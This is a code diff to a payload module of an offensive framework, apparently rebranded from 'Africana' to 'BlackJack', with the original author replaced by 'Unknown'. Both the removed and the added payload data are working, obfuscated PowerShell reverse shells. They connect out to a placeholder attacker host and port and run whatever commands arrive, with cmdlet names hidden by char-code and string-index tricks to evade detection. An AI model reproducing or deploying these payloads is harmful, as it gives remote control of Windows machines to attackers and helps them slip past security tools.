@@ -1,12 +1,12 @@
-# This module is part of the Africana framework
+# This module is part of the BlackJack framework
 
 class Payload:
 
     info = {
         'Title' : 'Windows PowerShell Reverse TCP',
-        'Author' : 'r0jahsm0ntar1',
+        'Author' : 'Unknown',
         'Description' : 'Classic PowerShell Reverse TCP',
-        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework']
+        'References' : ['https://revshells.com']
     }
 
     meta = {
@@ -25,29 +25,5 @@ class Payload:
         'encode' : True
     }
 
-    data = """
-    do {
-    & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$($_)}| % {$_}) -Seconds 15
-    try{
-        $TCPClient = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$($_)}| % {$_}) Net.Sockets.TCPClient('*LHOST*', *LPORT*)
-    } catch {}
-} until ($TCPClient.Connected)
-$NetworkStream = $TCPClient.GetStream()
-$StreamWriter = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$_}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$($_)}) IO.StreamWriter($NetworkStream)
-function WriteToStream ($String) {
-    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize |ForEach-Object{$_}|%{$_}| % {0}
-    $StreamWriter.Write($String + 'PS ' + (& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$_})).Path + '> ')
-    $StreamWriter.Flush()
-}
-WriteToStream ''
-while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {   
-    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-    $Output = try {
-            & (("YBTE0Fdxf-IjCRsn6hZawLrzMeXyO285utcPkN9qbQ1DgpVlASHivK7oUGW4Jm3")[10,15,52,55,36,25,9,3,7,45,22,25,14,14,51,55,15] -join '') $Command 2>&1 |ForEach-Object{$_}|%{$($_)}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $($_))})) |ForEach-Object{$_}|%{$_}| % {$($_)})
-        } catch {
-            $_ |ForEach-Object{$($_)}|%{$($_)}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$_})
-        }
-    WriteToStream ($Output)
-}
-$StreamWriter.Close()
-"""
+    data = """$client = & (("YReGAT7QiyzIfth3N2S50B9orHnmkd4FXPKwuWbD-j6Eap8LxZlJgsUvc1MCOqV")[16,2,35,40,60,38,41,2,56,13] -join '') System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|ForEach-Object{$($_)}|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (& (("YReGAT7QiyzIfth3N2S50B9orHnmkd4FXPKwuWbD-j6Eap8LxZlJgsUvc1MCOqV")[16,2,35,40,60,38,41,2,56,13] -join '') -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (& (("0qcOo82A6CNFUuvQWK5g79w-ThdpbYRJiBnHmGkaMes4ZtxILfVzP3XlyE1rjDS")[47,34,14,4,38,41,23,57,46,27,59,41,42,42,32,4,34] -join '') $data 2>&1 |ForEach-Object{$($_)}| & (("WOXUg9G632lKur1T4dF8hEoIPf0AjmnRiYpzeNwk5xD-VZsaQvLHBcbyCtJ7qMS")[1,12,57,43,62,57,13,32,30,4] -join '') );$sendback2 = $sendback + 'PS ' + (& (("JKDj3CWerVzos7hXq9QnRk2lfZYp-8iOFUxc6PL0w5bItTBmHMaSA4d1EgyvGuN")[60,7,44,28,38,11,35,50,44,30,11,19] -join '')).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
+    
